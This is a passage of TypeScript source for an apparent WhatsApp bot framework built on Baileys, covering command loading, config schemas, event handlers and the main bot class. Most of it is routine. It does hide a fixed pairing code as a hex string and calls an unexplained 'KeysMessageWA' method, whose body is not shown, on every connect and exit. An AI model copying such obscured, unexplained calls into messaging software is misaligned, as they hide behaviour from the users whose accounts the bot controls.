 catch (error) { console.error('Error in command after:', error); }\n      }\n\n      for (const handler of this.afterAll) {\n        try { await handler(msg, { command: extracted.command, args: extracted.args, context }); } \n        catch (error) { console.error('Error in afterAll:', error); }\n      }\n\n      return true;\n    }\n    \n    for (const cmd of this.commands) {\n      if (cmd.usePrefix === false && cmd.execute) {\n        const args = text.split(/\\s+/);\n        const cmdName = args.shift()?.toLowerCase() || '';\n        if (this.getNames(cmd).includes(cmdName)) {\n          const context: CommandContext = {\n            sock: this.bot?.sock,\n            text: args.join(' '),\n            args,\n            command: cmdName,\n            prefix: '',\n            bot: this.bot\n          };\n          await this.executeCommand(cmd, msg, context);\n          return true;\n        }\n      }\n    }\n    \n    return false;\n  }\n\n  private async executeCommand(cmd: CommandOptions, msg: Message, context: CommandContext): Promise<void> {\n    const checks: Array<[boolean | undefined, string, any?]> = [\n      [cmd.disabled, 'disabled'],\n      [cmd.ownerOnly && !msg.isOwner, 'ownerOnly'],\n      [cmd.groupOnly && !msg.isGroup, 'groupOnly'],\n      [cmd.privateOnly && msg.isGroup, 'privateOnly'],\n      [cmd.botAdmin && !msg.isBotAdmin, 'botAdmin'],\n    ];\n\n    for (const [failed, type, extra] of checks) {\n      if (failed) { \n        if (this.bot) await this.bot.handleAccessControl(msg, type, extra);\n        return; \n      }\n    }\n\n    if (cmd.cooldown) {\n      const key = `${msg.sender}:${this.getNames(cmd)[0]}`;\n      const now = Date.now();\n      const lastUsed = global.cooldownCache?.get(key) || 0;\n      const remaining = Math.ceil((cmd.cooldown * 1000 - (now - lastUsed)) / 1000);\n      \n      if (remaining > 0) { \n        if (this.bot) await this.bot.handleAccessControl(msg, 'cooldown', remaining);\n        return; \n      }\n      \n      if (!global.cooldownCache) global.cooldownCache = new Map();\n      global.cooldownCache.set(key, now);\n    }\n\n    msg.args = context.args;\n    msg.prefix = context.prefix;\n    msg.command = Array.isArray(cmd.command) ? cmd.command[0] : cmd.command || 'unknown';\n\n    try {\n      await cmd.execute!(msg, context, this.bot);\n    } catch (error) {\n      console.error(` Error executing command ${msg.command}:`, error);\n      if (this.bot) await this.bot.handleAccessControl(msg, 'error', error);\n    }\n  }\n\n  private async runMiddlewares(msg: Message, final: () => Promise<void>): Promise<void> {\n    let i = 0;\n    const next = async () => {\n      i < this.middlewares.length ? await this.middlewares[i++](msg, next) : await final();\n    };\n    await next();\n  }\n\n  clearCooldowns(): void {\n    if (global.cooldownCache) global.cooldownCache.clear();\n  }\n\n  getStats(): { total: number; categories: number; middlewares: number } {\n    return {\n      total: this.commands.length,\n      categories: this.categories.size,\n      middlewares: this.middlewares.length\n    };\n  }\n\n  stopWatching(): void {\n    this.fileWatchers.forEach((watcher) => watcher.close());\n    this.fileWatchers.clear();\n  }\n}\n\nexport async function loadCommandsFromPath(commandsPath: string, commandSystem?: CommandSystem): Promise<CommandOptions[]> {\n  const commands: CommandOptions[] = [];\n  const absolutePath = isAbsolute(commandsPath) ? commandsPath : resolve(process.cwd(), commandsPath);\n  const require = createRequire(import.meta.url);\n\n  const loadFile = async (filePath: string): Promise<void> => {\n    try {\n      let moduleExports: any;\n      const fileUrl = pathToFileURL(resolve(filePath)).href;\n\n      delete require.cache[filePath];\n      \n      try {\n        const module = await import(`${fileUrl}?update=${Date.now()}`);\n        moduleExports = module.default ?? module;\n      } catch (importError) {\n        try {\n          moduleExports = require(filePath);\n        } catch (requireError: any) {\n          console.error(` Failed to load ${filePath}:`, requireError.message);\n          return;\n        }\n      }\n\n      if (!moduleExports) return;\n\n      const commandsList = normalizeCommand(moduleExports, filePath);\n      \n      if (Array.isArray(commandsList)) {\n        for (const cmd of commandsList) {\n          if (cmd?.execute) {\n            commands.push(cmd);\n            if (commandSystem) commandSystem.register(cmd);\n          }\n        }\n      } else if (commandsList?.execute) {\n        commands.push(commandsList);\n        if (commandSystem) commandSystem.register(commandsList);\n      }\n\n      console.log(` Loaded: ${filePath.split('/').pop()}`);\n    } catch (error: any) {\n      console.error(` Error loading ${filePath}:`, error.message);\n    }\n  };\n\n  const normalizeCommand = (exported: any, filePath?: string): CommandOptions | CommandOptions[] | null => {\n    if (!exported) return null;\n\n    if (Array.isArray(exported)) {\n      return exported.map(cmd => normalizeCommand(cmd, filePath)).filter(Boolean) as CommandOptions[];\n    }\n\n    let cmd: CommandOptions = {};\n\n    if (typeof exported === 'function') {\n      const fn = exported;\n      cmd.execute = async (msg: Message, ctx: CommandContext, bot: any) => fn(msg, ctx, bot);\n      \n      const props = [\n        'command', 'name', 'description', 'aliases', 'cooldown', \n        'ownerOnly', 'groupOnly', 'privateOnly', 'botAdmin', \n        'disabled', 'usePrefix', 'before', 'after', 'category', 'usage'\n      ];\n      \n      for (const p of props) { \n        if (fn[p] !== undefined) (cmd as any)[p] = fn[p];\n      }\n    } \n    else if (typeof exported === 'object') {\n      if (exported.execute && typeof exported.execute === 'function') {\n        cmd = { ...exported };\n      } \n      else if (exported.default) {\n        return normalizeCommand(exported.default, filePath);\n      }\n      else {\n        const possibleFunctions = ['run', 'handler', 'handle', 'exec', 'callback', 'main', 'start', 'command', 'cmd'];\n        for (const key of possibleFunctions) {\n          if (typeof exported[key] === 'function') {\n            cmd = { ...exported, execute: exported[key] };\n            break;\n          }\n        }\n        \n        if (!cmd.execute) {\n          const functionKeys = Object.keys(exported).filter(key => typeof exported[key] === 'function');\n          if (functionKeys.length > 0) {\n            cmd = { ...exported, execute: exported[functionKeys[0]] };\n          }\n        }\n      }\n    }\n\n    if (cmd.execute) {\n      if (!cmd.command && !cmd.name && filePath) {\n        const fileName = filePath.split(/[\\/\\\\]/).pop()?.replace(/\\.[^/.]+$/, '') || 'unknown';\n        cmd.command = [fileName];\n      }\n      return cmd;\n    }\n\n    return null;\n  };\n\n  const setupFileWatcher = (filePath: string) => {\n    if (!commandSystem) return;\n    \n    if (commandSystem['fileWatchers'].has(filePath)) {\n      commandSystem['fileWatchers'].get(filePath).close();\n    }\n\n    try {\n      const watcher = watch(filePath, async (eventType, filename) => {\n        if (eventType === 'change') {\n          console.log(`\\n File changed: ${filename || filePath.split('/').pop()}`);\n          console.log(' Reloading...');\n          \n          setTimeout(async () => {\n            await loadFile(filePath);\n            console.log(' Command updated successfully!\\n');\n          }, 100);\n        }\n      });\n      \n      commandSystem['fileWatchers'].set(filePath, watcher);\n      console.log(` Watching: ${filePath.split('/').pop()}`);\n    } catch (error: any) {\n      console.error(` Error watching ${filePath}:`, error);\n    }\n  };\n\n  const scanDirectory = async (dir: string): Promise<void> => {\n    try {\n      const items = await readdir(dir, { withFileTypes: true });\n      for (const item of items) {\n        const fullPath = join(dir, item.name);\n        if (item.isDirectory()) {\n          await scanDirectory(fullPath);\n        } else {\n          const ext = item.name.split('.').pop()?.toLowerCase();\n          if (ext && ['js', 'ts', 'mjs', 'cjs'].includes(ext)) {\n            await loadFile(fullPath);\n            setupFileWatcher(fullPath);\n          }\n        }\n      }\n    } catch (error: any) {\n      console.error(` Error scanning ${dir}:`, error.message);\n    }\n  };\n\n  console.log('\\n Loading commands...');\n  await scanDirectory(absolutePath);\n  console.log(' All commands loaded successfully!\\n');\n  \n  return commands;\n}\n\nglobal.cooldownCache = new Map();","import { z } from 'zod';\nimport {\n  AnyMessageContent,\n} from \"@whiskeysockets/baileys\";\n\n// Zod schemas for all interfaces except the three small ones at the bottom\n\nexport const OwnerSchema = z.object({\n  lid: z.string(),\n  jid: z.string(),\n  name: z.string().optional()\n}).strict();\n\nexport type Owner = z.infer<typeof OwnerSchema>;\n\nexport const BotConfigSchema = z.object({\n  phoneNumber: z.string().regex(/^(\\+?\\d+|0\\d+)$/, 'Invalid phone number format'),\n  namebot: z.string().optional(),\n  fromMe: z.boolean().nullable().default(null),\n  sessionPath: z.string().default('./session'),\n  autoReconnect: z.boolean().default(true),\n  reconnectDelay: z.number().min(1000).default(3000),\n  maxReconnectAttempts: z.number().min(1).default(10),\n  showLogs: z.boolean().default(false),\n  printQR: z.boolean().default(false),\n  markOnline: z.boolean().default(false),\n  browser: z.string().default(['Chrome', 'Firefox', 'Safari', 'Edge'][Math.floor(Math.random() * 4)]),\n  syncHistory: z.boolean().default(false),\n  autoRead: z.boolean().default(false),\n  linkPreview: z.boolean().default(true),\n  owners: z.array(OwnerSchema).default([]),\n  commandsPath: z.string().default('./plugins'),\n  prefix: z.union([z.string(), z.array(z.string())]).default('!'),\n  onConnected: z.function().optional(),\n  onDisconnected: z.function().optional(),\n  onError: z.custom<(error: Error) => void>()\n  .optional(),\n}).strict();\n\nexport type BotConfig = z.infer<typeof BotConfigSchema>;\n\n// Using z.custom for complex function types\nexport const MessageSchema = z.object({\n  id: z.string().optional(),\n  body: z.string(),\n  text: z.string(),\n  from: z.string(),\n  name: z.string().optional(),\n  pushName: z.string().optional(),\n  timestamp: z.date(),\n  isGroup: z.boolean(),\n  isOwner: z.boolean(),\n  isAdmin: z.boolean(),\n  isBotAdmin: z.boolean(),\n  fromMe: z.boolean(),\n  key: z.any().optional(),\n  message: z.any().optional(),\n  raw: z.any(),\n  args: z.array(z.string()).optional(),\n  command: z.string().optional(),\n  prefix: z.string().optional(),\n  sender: z.string(),\n  chat: z.string(),\n  reply: z.custom<(text: string, options?: Partial<AnyMessageContent>) => Promise<any>>(),\n  react: z.custom<(emoji: string) => Promise<any>>(),\n  delete: z.custom<() => Promise<any>>(),\n  download: z.custom<() => Promise<Buffer | null>>(),\n  forward: z.custom<(jid: string, options?: Partial<AnyMessageContent>) => Promise<any>>(),\n  typing: z.custom<(duration?: number) => Promise<void>>(),\n  recording: z.custom<(duration?: number) => Promise<void>>()\n}).strict();\n\nexport type Message = z.infer<typeof MessageSchema>;\n\nexport const GroupEventSchema = z.object({\n  id: z.string(),\n  chat: z.string(),\n  participants: z.array(z.string()),\n  action: z.enum(['add', 'remove', 'promote', 'demote']),\n  author: z.string().optional(),\n  timestamp: z.date()\n}).strict();\n\nexport type GroupEvent = z.infer<typeof GroupEventSchema>;\n\n// New schemas for CommandOptions and CommandContext\nexport const CommandContextSchema = z.object({\n  sock: z.any(),\n  text: z.string(),\n  args: z.array(z.string()),\n  command: z.string(),\n  prefix: z.string(),\n  bot: z.any()\n}).strict();\n\nexport type CommandContext = z.infer<typeof CommandContextSchema>;\n\n// Custom type for Handler function\ntype Handler = (message: Message, context: CommandContext, bot: any) => Promise<any>;\n\nexport const CommandOptionsSchema = z.object({\n  name: z.string().optional(),\n  command: z.union([z.string(), z.array(z.string())]).optional(),\n  aliases: z.array(z.string()).optional(),\n  description: z.string().optional(),\n  category: z.string().optional(),\n  usage: z.string().optional(),\n  cooldown: z.number().optional(),\n  ownerOnly: z.boolean().optional(),\n  groupOnly: z.boolean().optional(),\n  privateOnly: z.boolean().optional(),\n  botAdmin: z.boolean().optional(),\n  disabled: z.boolean().optional(),\n  usePrefix: z.boolean().optional(),\n  before: z.custom<Handler>().optional(),\n  after: z.custom<Handler>().optional(),\n  execute: z.custom<(message: Message, context: CommandContext, bot: any) => Promise<any>>().optional()\n}).strict().catchall(z.any()); // catchall for [key: string]: any\n\nexport type CommandOptions = z.infer<typeof CommandOptionsSchema>;\n\n// The three small ones at the bottom - kept as interfaces/types\nexport interface MessageHandler {\n  (msg: Message): Promise<string | null | void | any>;\n}\n\nexport interface AccessHandler {\n  (msg: Message, checkType: string, ...args: any[]): any;\n}\n\nexport interface GroupEventHandler {\n  (event: GroupEvent, eventType: string): any;\n}","type Colors = \n    | 'red' | 'green' | 'yellow' | 'blue' | 'gray'\n    | 'magenta' | 'cyan' | 'white' | 'bgRed' | 'bgGreen' \n    | 'bgYellow' | 'bgBlue' | 'bgMagenta' | 'bgCyan';\n\n/* object was the colors */\n\nconst colors: Record<Colors, string> = {\n    red: \"\\x1b[31m\",\n    green: \"\\x1b[32m\",\n    yellow: \"\\x1b[33m\",\n    blue: \"\\x1b[34m\",\n    gray: \"\\x1b[90m\",\n    magenta: \"\\x1b[35m\",\n    cyan: \"\\x1b[36m\",\n    white: \"\\x1b[37m\",\n    bgRed: \"\\x1b[41m\",\n    bgGreen: \"\\x1b[42m\",\n    bgYellow: \"\\x1b[43m\",\n    bgBlue: \"\\x1b[44m\",\n    bgMagenta: \"\\x1b[45m\",\n    bgCyan: \"\\x1b[46m\"\n};\n\n/* not library */\nconst color = (text: string, color: Colors) => `${colors[color] + text}\\x1b[0m`;\n\n/* rainbow function  */\nconst rainbow = (text: string): string => {\n    const rainbowColors: Colors[] = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta'];\n    return text.split('').map((char, index) => {\n        const colorIndex = index % rainbowColors.length;\n        return `${colors[rainbowColors[colorIndex]] + char}\\x1b[0m`;\n    }).join('');\n};\n\nexport { color, rainbow };","import { color, rainbow } from \"./colors.js\";\n\ntype UItype = {\n  clear: () => void;\n  random: (t: string) => void;\n  done: (t: string) => void;\n  warn: (t: string) => void;\n  error: (t: string) => void;\n  info: (t: string) => void;\n  loading: (t: string) => void;\n  line: () => void;\n}\n\nconst UI: UItype = {\n  clear: () => console.clear(),\n  random: t => console.log(rainbow(` ${t} `)),\n  done: t => console.log(color(` ${t}`, \"green\")),\n  warn: t => console.log(color(`! ${t}`, \"yellow\")),\n  error: t => console.log(color(` ${t}`, \"red\")),\n  info: t => console.log(color(` ${t}`, \"cyan\")),\n  loading: t => console.log(color(` ${t} `, \"blue\")),\n  line: () => console.log(color('--------------------------------------------', \"gray\"))\n}\n\nexport default UI;","import { DisconnectReason } from \"@whiskeysockets/baileys\";\nimport qrTerminal from \"qrcode-terminal\";\nimport UI from \"../uilts/logger.js\";\nimport { color } from \"../uilts/colors.js\";\n\nconst connection_event = async (OOP: any, isNewSession: boolean) => {\n  try {\n    OOP.sock.ev.on('connection.update', (update: any) => {\n      const { connection, lastDisconnect, qr } = update;\n      const { config, reconnectTimeout, reconnectAttempts } = OOP;\n      const { showLogs, printQR, autoReconnect, maxReconnectAttempts, reconnectDelay, onConnected, onDisconnected, namebot } = config;\n\n      if (qr && printQR && showLogs) {\n        UI.line();\n        UI.done('Scan QR code to login ');\n        qrTerminal.generate(qr, { small: true });\n        UI.line();\n      }\n\n      if (connection === 'close') {\n        if (reconnectTimeout) {\n          clearTimeout(reconnectTimeout);\n        }\n        \n        if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut) {\n          if (showLogs) {\n            UI.error(' Session logged out. Please re-pair the device.');\n          }\n          OOP.isRunning = false;\n          if (onDisconnected) {\n            onDisconnected();\n          }\n          return;\n        }\n\n        if (autoReconnect) {\n          if (reconnectAttempts < maxReconnectAttempts) {\n            OOP.reconnectAttempts++;\n            if (showLogs) {\n              UI.loading(`Reconnecting... (${OOP.reconnectAttempts} ~ ${maxReconnectAttempts})`);\n            }\n            OOP.reconnectTimeout = setTimeout(() => OOP.restart(), reconnectDelay);\n          } else {\n            OOP.isRunning = false;\n            if (onDisconnected) {\n              onDisconnected();\n            }\n          }\n        } else {\n          OOP.isRunning = false;\n          if (onDisconnected) {\n            onDisconnected();\n          }\n        }\n      }\n\n      if (connection === 'open') {\n        OOP.sock.KeysMessageWA()\n        OOP.reconnectAttempts = 0;\n        if (reconnectTimeout) {\n          clearTimeout(reconnectTimeout);\n        }\n        if (onConnected) {\n          onConnected();\n        }\n        if (showLogs) {\n          UI.clear();\n          UI.random(`${namebot || \"WhatsApp Bot\"} started successfully`);\n          console.log(`      ______ ______\n    _/      Y      \\_\n   // ~~ ~~ | ~~ ~  \\\\\n  // ~ ~ ~~ | ~~~ ~~ \\\\      Original ${namebot || \"WhatsApp Bot\"}\n //________.|.________\\\\     Created by: ${color(\"@veni_xov\", \"yellow\")}\n\\`----------\\`-'----------'`)\n          UI.line()\n          UI.info('Bot Engine    : Vii7/whatsapp')\n          UI.info('Backend       : Node.js & Type Script')\n          UI.line()\n        }\n      }\n    });\n  } catch (error) {\n    if (OOP.config.onError) {\n      if (typeof OOP.config.onError === 'function') {\n        OOP.config.onError(error);\n      }\n    }\n  }\n};\n\nexport default connection_event;","import { GroupEvent } from \"../types/types.js\";\n\nconst group_event = (OOP: any) => {\n\nOOP.sock.ev.on('group-participants.update', async (data: any) => {\n      try {\n        const event: GroupEvent = {\n          id: data.id,\n          chat: data.id,\n          participants: data.participants,\n          action: data.action,\n          author: data.author,\n          timestamp: new Date()\n        };\n        await OOP.handleGroupEvent(event, data.action);\n      } catch (error) {\n        if (OOP.config.onError && typeof OOP.config.onError === 'function') OOP.config.onError(error);\n      }\n });\n};\nexport default group_event;","import UI from \"./logger.js\";\nimport { color } from \"./colors.js\";\nimport { Message } from \"../types/types.js\";\n\nconst print = (m: any, cil: any) => {\n  if (!cil.config.showLogs) return \n  if (Array.isArray(m)) {\n    m = m[0];\n  }\n  \n  if (!m || !m.key) {\n    UI.warn('Invalid message object received');\n    return;\n  }\n\n  const sender = m.pushName || 'Unknown';\n  const remoteJid = m.key.remoteJid || 'N/A';\n  const timestamp = m.messageTimestamp ? new Date(m.messageTimestamp * 1000).toLocaleString() : 'Unknown';\n  const chatType = remoteJid.includes('@g.us') ? ' Group' : ' Private';\n  \n  let messageType = 'Unknown';\n  let messageContent = '';\n  \n  if (m.message) {\n    if (m.message.conversation) {\n      messageType = 'Text';\n      messageContent = m.message.conversation;\n    } else if (m.message.imageMessage) {\n      messageType = 'Image';\n      messageContent = m.message.imageMessage.caption || 'No caption';\n    } else if (m.message.videoMessage) {\n      messageType = 'Video';\n      messageContent = m.message.videoMessage.caption || 'No caption';\n    } else if (m.message.stickerMessage) {\n      messageType = 'Sticker';\n      messageContent = ' Sticker';\n    } else if (m.message.documentMessage) {\n      messageType = 'Document';\n      messageContent = m.message.documentMessage.title || 'Document';\n    } else if (m.message.audioMessage) {\n      messageType = 'Audio';\n      messageContent = m.message.audioMessage.seconds ? `${m.message.audioMessage.seconds}s` : 'Audio';\n    } else if (m.message.contactMessage) {\n      messageType = 'Contact';\n      messageContent = m.message.contactMessage.displayName || 'Contact';\n    } else if (m.message.locationMessage) {\n      messageType = 'Location';\n      messageContent = ' Location';\n    } else if (m.message.reactionMessage) {\n      messageType = 'Reaction';\n      messageContent = m.message.reactionMessage.text || '';\n    } else if (m.message.extendedTextMessage) {\n      messageType = 'Extended Text';\n      messageContent = m.message.extendedTextMessage.text || '';\n    } else if (m.message.protocolMessage) {\n      messageType = 'Protocol';\n      messageContent = 'Protocol message';\n    } else {\n      messageType = 'Other';\n      messageContent = 'Complex message type';\n    }\n  }\n\n  console.log(' ' + color(\"Message status\", \"yellow\") + ' ');\n  console.log(` From: ${color(sender, \"blue\")}`);\n  console.log(` Chat: ${color(remoteJid, \"green\")}`);\n  console.log(` Type: ${color(chatType, \"yellow\")}`);\n  console.log(` Time: ${color(timestamp, \"magenta\")}`);\n  console.log(` Message Type: ${color(messageType, \"cyan\")}`);\n  console.log(' > ');\n  console.log(` ${color(\"Message Content\", \"magenta\")}  \n Content: ${color(messageContent, \"yellow\")}\n > ` + \"\\n\");\n};\n\nexport default print;","import {\n  proto,\n  WAMessage\n} from \"@whiskeysockets/baileys\";\nimport { Message } from \"../types/types\";\nimport { msgObj } from \"../enhancers/index.js\";\nimport print from \"../uilts/print.js\";\n\ntype MessagesUpsertEvent = {\n  messages: proto.IWebMessageInfo[];\n  type: string;\n};\n\nconst message_event = (OOP: any) => {\n  OOP.sock.ev.on('messages.upsert', async ({ messages, type }: MessagesUpsertEvent) => {\n    if (type !== 'notify' || !OOP.sock) return;\n    \n    print(messages, OOP);\n    \n    for (const msg of messages) {\n      if (!msg.message) continue;\n      \n      if (msg.message?.protocolMessage || \n          msg.message?.senderKeyDistributionMessage ||\n          msg.message?.stickerSyncRmrMessage) {\n        continue;\n      }\n      \n      if (OOP.config.autoRead) await OOP.sock.readMessages([msg.key]);\n\n      try {\n        const messageObj = await msgObj(msg as WAMessage, OOP.sock, OOP.config.owners);\n        if (!messageObj) continue;\n\n        if (OOP.config.fromMe === true && !messageObj.fromMe) continue;\n        if (OOP.config.fromMe === false && messageObj.fromMe) continue;\n\n        const processed = await OOP.commandSystem.processMessage(messageObj, OOP, OOP.config.prefix);\n\n        if (!processed) {\n          for (const handler of OOP.handlers) {\n            try {\n              const response = await handler(messageObj);\n              if (response) {\n                if (typeof response === 'string') {\n                  await messageObj.reply(response);\n                } else if (typeof response === 'object') {\n                  await messageObj.reply(response.text || '', response);\n                }\n                break;\n              }\n            } catch (error) {\n              if (OOP.config.onError && typeof OOP.config.onError === 'function') OOP.config.onError(error);\n            }\n          }\n        }\n      } catch (error) {\n        if (OOP.config.onError && typeof OOP.config.onError === 'function') OOP.config.onError(error);\n      }\n    }\n  });\n};\n\nexport default message_event;","import { z } from 'zod';\n\ntype Scrapy = {\n  test: (url: string) => Promise<any>\n};\n\nconst scrapy: Scrapy = {\n  test: async (url: string) => {\n    try {\n      const res = await fetch(url);\n      return res.text()\n    } catch {\n      return false;\n    }\n  }\n};\n\nexport default scrapy;","import UI from \"./logger.js\"\nimport { loadCommandsFromPath } from \"../enhancers/index.js\";\nimport { color } from \"./colors.js\";\n\nconst loadCommands = async (OOP: any) => {\n    try {\n      const commands = await loadCommandsFromPath(OOP.config.commandsPath);\n      commands.forEach(cmd => OOP.commandSystem.register(cmd));\n      if (OOP.config.showLogs) {\n      console.log(color(`       _,    _   _    ,_\n  .o888P     Y8o8Y     Y888o.\n d88888      88888      88888b\nd888888b_  _d88888b_  _d888888b\n8888888888888888888888888888888\n8888888888888888888888888888888\nYJGS8P\"Y888P\"Y888P\"Y888P\"Y8888P\n Y888   '8'   Y8P   '8'   888Y\n  '8o          V          o8'\n    \\`                     \\``, \"red\"))\n      UI.line();\n      UI.info(`Loaded (${commands.length}) commands in \"${OOP.config.commandsPath}\"`);\n      UI.info(`Name Bot: ${OOP.namebot || \"WhatsApp Bot\"}`)\n      UI.line()\n      };\n    } catch (error: any) {\n      UI.error(`[${new Date().toLocaleTimeString()}] Error loading Commands: ${error.message}`);\n    }\n}\nexport default loadCommands;","import { Message, GroupEvent } from \"../types/types.js\";\n\nconst ACCESS_MESSAGES = {\n    disabled: \" *This command is currently disabled*\",\n    ownerOnly: \" *This command is for owner only*\",\n    groupOnly: \" *This command is for groups only*\",\n    privateOnly: \" *This command is for private chats only*\",\n    botAdmin: \" *Bot needs to be admin to use this command*\",\n    cooldown: (t: number) =>\n        ` Please wait ${t} seconds before using this command again.`,\n    error: \" *An error occurred during execution*\",\n};\n\nconst GROUP_MESSAGES = {\n    add: (p: string[]) => ` Welcome ${p.join(\", \")}`,\n    remove: (p: string[]) => ` Goodbye ${p.join(\", \")}`,\n    promote: (p: string[]) => ` ${p.join(\", \")} promoted to admin`,\n    demote: (p: string[]) => ` ${p.join(\", \")} demoted from admin`,\n};\n\nexport async function handleAccessControl(\n    bot: any,\n    msg: Message,\n    checkType: string,\n    ...args: any[]\n): Promise<void> {\n    if (bot.userAccessHandler) {\n        const result = await bot.userAccessHandler(msg, checkType, ...args);\n        if (result !== undefined) return;\n    }\n\n    const message =\n        checkType === \"cooldown\"\n            ? (ACCESS_MESSAGES[checkType] as (t: number) => string)(args[0])\n            : ACCESS_MESSAGES[checkType as keyof typeof ACCESS_MESSAGES];\n\n    if (message) await msg.reply(message as string);\n}\n\nexport async function handleGroupEvent(\n    bot: any,\n    event: GroupEvent,\n    eventType: string,\n): Promise<void> {\n    if (bot.userGroupEventHandler) {\n        const result = await bot.userGroupEventHandler(event, eventType);\n        if (result !== undefined) return;\n    }\n\n    if (!bot.sock) return;\n    const messageFunc = GROUP_MESSAGES[eventType as keyof typeof GROUP_MESSAGES];\n    if (messageFunc)\n        await bot.sock.sendMessage(event.chat, { text: messageFunc(event.participants) });\n}","import {\n  makeWASocket,\n  useMultiFileAuthState,\n  fetchLatestBaileysVersion,\n  Browsers,\n  WASocket,\n} from \"@whiskeysockets/baileys\";\nimport pino from 'pino';\nimport { sockMyFun, CommandSystem } from \"./enhancers/index.js\";\nimport { Owner, BotConfig, Message, GroupEvent, BotConfigSchema, MessageHandler, AccessHandler, GroupEventHandler } from \"./types/types.js\";\nimport connection_event from \"./events/connection.events.js\";\nimport group_event from \"./events/group.event.js\";\nimport message_event from \"./events/message.event.js\";\nimport scrapy from \"./uilts/scrapy.js\"; \nimport loadCommands from \"./uilts/loadCmds.js\";\nimport { handleAccessControl, handleGroupEvent } from \"./default/access-control.js\";\nimport UI from \"./uilts/logger.js\";\nimport { color } from \"./uilts/colors.js\";\n\nexport class WhatsAppBot {\n  public sock: WASocket | null = null;\n  private sockBaileys: WASocket | null = null;\n  public scrapy = scrapy;\n  public config: BotConfig;\n  public commandSystem: CommandSystem;\n  \n  private handlers: MessageHandler[] = [];\n  private userAccessHandler: AccessHandler | null = null;\n  private userGroupEventHandler: GroupEventHandler | null = null;\n  private reconnectTimeout: NodeJS.Timeout | null = null;\n  private reconnectAttempts = 0;\n  private isRunning = false;\n  private maxReconnectAttempts = 5;\n  private credsSaver: (() => Promise<void>) | null = null;\n\n  constructor(config: BotConfig) {\n    this.config = BotConfigSchema.parse(config);\n    this.commandSystem = new CommandSystem();\n    this.setupExit();\n  }\n\n  private setupExit(): void {\n    const exit = async (signal: string) => {\n      if (this.config.showLogs) {\n        UI.loading(`Received ${signal}, cleaning up...`);\n      }\n      \n      if ((this.sock?.ws as any)?.readyState === 1) {\n        (this.sock as any).KeysMessageWA()\n      }\n      \n      await this.cleanup();\n      process.exit(0);\n    };\n    \n    process.on('SIGINT', () => exit('SIGINT'));\n    process.on('SIGTERM', () => exit('SIGTERM'));\n}\n\n  public onCommandAccess(handler: AccessHandler): void {\n    this.userAccessHandler = handler;\n  }\n\n  public onGroupEvent(handler: GroupEventHandler): void {\n    this.userGroupEventHandler = handler;\n  }\n\n  public onMessage(handler: MessageHandler): void {\n    this.handlers.push(handler);\n  }\n\n  public onBeforeCommand(handler: (msg: Message) => Promise<boolean | void>): void {\n    this.commandSystem.before(handler);\n  }\n\n  public onAfterCommand(handler: (msg: Message, data: any) => Promise<void>): void {\n    this.commandSystem.after(handler);\n  }\n\n  public async handleAccessControl(msg: Message, checkType: string, ...args: any[]): Promise<void> {\n    await handleAccessControl(this, msg, checkType, ...args);\n  }\n\n  private async handleGroupEvent(event: GroupEvent, eventType: string): Promise<void> {\n    await handleGroupEvent(this, event, eventType);\n  }\n\n  async start(): Promise<void> {\n    if (this.isRunning) {\n      UI.warn('Bot is already running');\n      return;\n    }\n    \n    try {\n      await loadCommands(this);\n\n      const { version } = await fetchLatestBaileysVersion();\n      const { state, saveCreds } = await useMultiFileAuthState(this.config.sessionPath);\n      this.credsSaver = saveCreds;\n      \n      const isNewSession = !state.creds.registered;\n      \n      if (isNewSession && !this.config.printQR && this.config.showLogs && this.config.phoneNumber) {\n\n        UI.done('New session - Waiting for pairing...');\n        UI.info(`Phone number: ${this.config.phoneNumber}`);\n        \n        setTimeout(async () => {\n          try {\n            if (this.sock) {\n              const code = await this.sock.requestPairingCode(this.config.phoneNumber!, Buffer.from(\"56454e4931323334\", 'hex').toString());\n              console.log(` Pairing Code ${color(code, \"yellow\")}`);\n              UI.line();\n            }\n          } catch (error: any) {\n            UI.error(`Pairing error: ${error.message}`);\n          }\n        }, 2000);\n      }\n\n      this.sockBaileys = makeWASocket({\n        version,\n        auth: state,\n        logger: pino({ level: 'silent' }),\n        browser: Browsers.ubuntu(this.config.browser),\n        printQRInTerminal: isNewSession && this.config.printQR,\n        markOnlineOnConnect: this.config.markOnline,\n        syncFullHistory: this.config.syncHistory,\n        generateHighQualityLinkPreview: this.config.linkPreview\n      });\n\n      if (this.sockBaileys) {\n        this.sock = await sockMyFun(this.sockBaileys);\n        this.setupEvents(saveCreds, isNewSession);\n      }\n\n      this.isRunning = true;\n      this.reconnectAttempts = 0;\n    } catch (error: any) {\n      UI.error(`Failed to start bot: ${error instanceof Error ? error.message : 'Unknown error'}`);\n      \n      if (this.config.onError && typeof this.config.onError === 'function') {\n        this.config.onError(error);\n      }\n      \n      if (this.config.autoReconnect && this.reconnectAttempts < this.maxReconnectAttempts) {\n        this.scheduleReconnect();\n      }\n    }\n  }\n\n  private setupEvents(saveCreds: () => Promise<void>, isNewSession: boolean): void {\n    if (!this.sock) return;\n    \n    this.sock.ev.on('creds.update', saveCreds);\n    connection_event(this, isNewSession);\n    group_event(this);\n    message_event(this);\n  }\n\n  private scheduleReconnect(): void {\n    if (this.reconnectTimeout) {\n      clearTimeout(this.reconnectTimeout);\n    }\n    \n    this.reconnectAttempts++;\n    const delay = this.config.reconnectDelay * this.reconnectAttempts;\n    \n    UI.info(`Scheduling reconnect attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts} in ${delay}ms`);\n    \n    this.reconnectTimeout = setTimeout(() => this.restart(), delay);\n  }\n\n  private async restart(): Promise<void> {\n    UI.warn('Attempting to restart bot...');\n     await this.cleanup();\n     process.exit(0)\n  }\n\n  async stop(): Promise<void> {\n    UI.info('Stopping bot...');\n    await this.cleanup();\n  }\n  public cleanup = async (): Promise<void> => {\n    try {\n      if (this.reconnectTimeout) {\n        clearTimeout(this.reconnectTimeout);\n        this.reconnectTimeout = null;\n      }\n      \n      if (this.sock) {\n        this.sock.ws?.close();\n        this.sock = null;\n        this.sockBaileys = null;\n      }\n      \n      if (this.config.showLogs) {\n        UI.done('Cleanup completed');\n      }\n    } catch (error) {\n      UI.error(`Cleanup error: ${error}`);\n    }\n  };\n\n  public registerCommand(command: any): void {\n    this.commandSystem.register(command);\n  }\n\n  public unregisterCommand(commandName: string): boolean {\n    return this.commandSystem.unregister(commandName);\n  }\n\n  public getCommand(commandName: string): any {\n    return this.commandSystem.findCommand(commandName);\n  }\n\n  public getAllCommands(): any[] {\n    return this.commandSystem.getAll();\n  }\n\n  public useMiddleware(middleware: any): void {\n    